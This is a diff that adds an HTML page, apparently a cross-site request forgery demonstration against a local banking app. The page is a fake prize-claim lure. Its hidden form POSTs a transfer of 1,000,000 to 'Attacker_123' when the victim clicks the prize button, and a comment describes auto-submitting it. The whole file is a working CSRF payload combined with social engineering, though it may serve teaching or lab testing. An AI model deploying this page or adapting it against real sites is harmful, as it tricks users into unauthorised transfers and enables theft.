@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win Free Prizes!</title>
+</head>
+<body>
+    <h1>Congratulations! You won!</h1>
+    <p>Click the button below to claim your prize.</p>
+    
+    <!-- This is the CSRF attack: it POSTs to the bank from a different origin -->
+    <form id="attack_form" action="http://localhost:8000/transfer" method="POST">
+        <input type="hidden" name="to" value="Attacker_123">
+        <input type="hidden" name="amount" value="1000000">
+        <button type="submit" style="padding:20px; background:green; color:white; font-size:24px;">CLAIM PRIZE NOW!</button>
+    </form>
+
+    <script>
+        // In a real attack, we might auto-submit this:
+        // document.getElementById("attack_form").submit();
+        // Since our browser requires a click to submit forms, 
+        // we use a "SOCIAL ENGINEERING" approach here!
+    </script>
+</body>
+</html>
